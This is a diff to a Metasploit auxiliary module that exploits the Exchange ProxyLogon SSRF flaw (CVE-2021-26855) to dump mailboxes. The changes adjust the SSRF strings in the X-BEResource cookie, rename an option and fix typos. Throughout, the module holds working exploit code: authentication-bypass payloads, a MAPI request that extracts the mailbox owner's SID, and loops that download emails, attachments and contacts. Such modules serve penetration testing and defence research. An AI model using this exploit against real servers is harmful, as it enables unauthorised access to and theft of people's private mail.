@@ -13,15 +13,12 @@ class MetasploitModule < Msf::Auxiliary
         info,
         'Name' => 'Microsoft Exchange ProxyLogon Collector',
         'Description' => %q{
-          This module scan for a vulnerability on Microsoft Exchange Server that
+          This module exploit a vulnerability on Microsoft Exchange Server that
           allows an attacker bypassing the authentication and impersonating as the
           admin (CVE-2021-26855).
 
-          By chaining this bug with another post-auth arbitrary-file-write
-          vulnerability to get code execution (CVE-2021-27065).
-
-          As a result, an unauthenticated attacker can execute arbitrary commands on
-          Microsoft Exchange Server.
+          By taking advantage of this vulnerability, it is possible to dump all
+          mailboxes (emails, attachments, contacts, ...).
 
           This vulnerability affects (Exchange 2013 Versions < 15.00.1497.012,
           Exchange 2016 CU18 < 15.01.2106.013, Exchange 2016 CU19 < 15.01.2176.009,
@@ -66,7 +63,7 @@ class MetasploitModule < Msf::Auxiliary
       OptString.new('EMAIL', [true, 'The email account what you want dump']),
       OptString.new('FOLDER', [true, 'The email folder what you want dump', 'inbox']),
       OptEnum.new('METHOD', [true, 'HTTP Method to use for the check (only).', 'POST', ['GET', 'POST']]),
-      OptString.new('ForceTarget', [false, 'Force the name of the internal Exchange server targeted'])
+      OptString.new('TARGET', [false, 'Force the name of the internal Exchange server targeted'])
     ])
 
     register_advanced_options([
@@ -77,7 +74,7 @@ class MetasploitModule < Msf::Auxiliary
   XMLNS = { 't' => 'http://schemas.microsoft.com/exchange/services/2006/types' }.freeze
 
   def dump_contacts(server_name)
-    ssrf = "Admin@#{server_name}:444/EWS/Exchange.asmx?a=~1942062522;"
+    ssrf = "#{server_name}/EWS/Exchange.asmx?a=~1942062522"
 
     response = send_xml(soap_countitems(action['id_attribute']), ssrf)
     if response.body =~ /Success/
@@ -91,7 +88,7 @@ class MetasploitModule < Msf::Auxiliary
       print_status(" * number of contact found: #{total_count}")
 
       if total_count.to_i > datastore['MaxEntries']
-        print_warning(" * number of contact recaluled due to max entries: #{datastore['MaxEntries']}")
+        print_warning(" * number of contact recalculated due to max entries: #{datastore['MaxEntries']}")
         total_count = datastore['MaxEntries'].to_s
       end
 
@@ -109,7 +106,7 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def dump_emails(server_name)
-    ssrf = "Admin@#{server_name}:444/EWS/Exchange.asmx?a=~1942062522;"
+    ssrf = "#{server_name}/EWS/Exchange.asmx?a=~1942062522"
 
     response = send_xml(soap_countitems(datastore['FOLDER']), ssrf)
     if response.body =~ /Success/
@@ -123,7 +120,7 @@ class MetasploitModule < Msf::Auxiliary
       print_status(" * number of email found: #{total_count}")
 
       if total_count.to_i > datastore['MaxEntries']
-        print_warning(" * number of email recaluled due to max entries: #{datastore['MaxEntries']}")
+        print_warning(" * number of email recalculated due to max entries: #{datastore['MaxEntries']}")
         total_count = datastore['MaxEntries'].to_s
       end
 
@@ -136,7 +133,7 @@ class MetasploitModule < Msf::Auxiliary
     response = send_xml(soap_listattachments(item_id), ssrf)
     xml = Nokogiri::XML.parse(response.body)
 
-    xml.xpath("//t:Message/t:Attachments/t:FileAttachment", XMLNS).select do|item|
+    xml.xpath("//t:Message/t:Attachments/t:FileAttachment", XMLNS).each do|item|
       item_id = item.at_xpath('./t:AttachmentId', XMLNS).values[0]
 
       response = send_xml(soap_downattachment(item_id), ssrf)
@@ -155,7 +152,7 @@ class MetasploitModule < Msf::Auxiliary
     response = send_xml(soap_listitems(datastore['FOLDER'], total_count), ssrf)
     xml = Nokogiri::XML.parse(response.body)
 
-    xml.xpath("//t:Items/t:Message", XMLNS).select do|item|
+    xml.xpath("//t:Items/t:Message", XMLNS).each do|item|
       item_info = item.at_xpath("./t:ItemId", XMLNS).values
       print_status(" * download item: #{item_info[1]}")
 
@@ -180,11 +177,11 @@ class MetasploitModule < Msf::Auxiliary
   def request_autodiscover(server_name)
     xmlns = { 'xmlns' => 'http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a' }
 
-    response = send_xml(soap_autodiscover, "#{server_name}/autodiscover/autodiscover.xml?a=~1942062522;")
+    response = send_xml(soap_autodiscover, "#{server_name}/autodiscover/autodiscover.xml?a=~1942062522")
     xml = Nokogiri::XML.parse(response.body)
 
     legacy_dn = xml.at_xpath('//xmlns:User/xmlns:LegacyDN', xmlns).content
-    fail_with(Failure::Unknown, 'The `LegacyDN` value could not be found') if legacy_dn.empty?
+    fail_with(Failure::Unknown, 'The \'LegacyDN\' value could not be found') if legacy_dn.empty?
 
     server = ''
     owa_urls = []
@@ -200,7 +197,7 @@ class MetasploitModule < Msf::Auxiliary
         end
       end
     end
-    fail_with(Failure::Unknown, 'No `OWAUrl` was found') unless owa_urls.length > 0
+    fail_with(Failure::Unknown, 'No \'OWAUrl\' was found') unless owa_urls.length > 0
 
     return([server, legacy_dn, owa_urls])
   end
@@ -209,12 +206,12 @@ class MetasploitModule < Msf::Auxiliary
     mapi_data = "#{legacy_dn}\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
 
     sid = ''
-    response = send_mapi(mapi_data, "Admin@#{server_name}:444/mapi/emsmdb?MailboxId=#{server_id}&a=~1942062522;")
+    response = send_mapi(mapi_data, "Admin@#{server_name}:444/mapi/emsmdb?MailboxId=#{server_id}&a=~1942062522")
     if response.code == 200 && response.body =~ /act as owner of a UserMailbox/
       sid_regex = /S-[0-9]{1}-[0-9]{1}-[0-9]{2}-[0-9]{10}-[0-9]{9}-[0-9]{10}-[0-9]{3,4}/
       sid = response.body.match(sid_regex)
     end
-    fail_with(Failure::Unknown, 'No `SID` was found') if sid.to_s.empty?
+    fail_with(Failure::Unknown, 'No \'SID\' was found') if sid.to_s.empty?
 
     sid
   end
@@ -223,7 +220,7 @@ class MetasploitModule < Msf::Auxiliary
     request = {
       'method' => method,
       'uri' => @random_uri,
-      'cookie' => "X-BEResource=#{ssrf}",
+      'cookie' => "X-BEResource=#{ssrf};",
       'ctype' => ctype
     }
     request = request.merge({'data' => data}) unless data.empty?
@@ -238,11 +235,11 @@ class MetasploitModule < Msf::Auxiliary
     request = {
       'method' => 'POST',
       'uri' => @random_uri,
-      'cookie' => "X-BEResource=#{ssrf}",
+      'cookie' => "X-BEResource=#{ssrf};",
       'ctype' => 'application/mapi-http',
       'headers' => {
         'X-Requesttype' => 'Connect',
-        'X-Requestid' => '111111111111111',
+        'X-Requestid' => "#{Rex::Text.rand_text_numeric(12..13)}",
         'X-Clientapplication' => 'Outlook/15.0.4815.1002'
       },
       'data' => data
@@ -258,7 +255,7 @@ class MetasploitModule < Msf::Auxiliary
     received = send_request_cgi(
       'method' => 'POST',
       'uri' => @random_uri,
-      'cookie' => "X-BEResource=#{ssrf}",
+      'cookie' => "X-BEResource=#{ssrf};",
       'ctype' => 'text/xml; charset=utf-8',
       'data' => data
     )
@@ -405,7 +402,7 @@ class MetasploitModule < Msf::Auxiliary
     print_status(message('Attempt to exploit for CVE-2021-26855'))
 
     # request for internal server name.
-    response = send_http(datastore['METHOD'], 'localhost~1942062522;')
+    response = send_http(datastore['METHOD'], 'localhost~1942062522')
     if response.code != 500 || response.headers['X-FEServer'].empty?
       print_bad('Could\'t get the \'X-FEServer\' from the headers response.')
 
@@ -430,7 +427,7 @@ class MetasploitModule < Msf::Auxiliary
 
     # selecting target
     print_status(message('Selecting the first internal server found'))
-    if datastore['ForceTarget'].nil?
+    if datastore['TARGET'].nil?
       target = ''
       discover_info[2].each do |url|
         host = url.split('://')[1].split('.')[0].downcase
@@ -444,7 +441,7 @@ class MetasploitModule < Msf::Auxiliary
 
       print_status(" * targeting internal: #{target}")
     else
-      target = datastore['ForceTarget']
+      target = datastore['TARGET']
       print_status(" * targeting internal forced to: #{target}")
     end
 
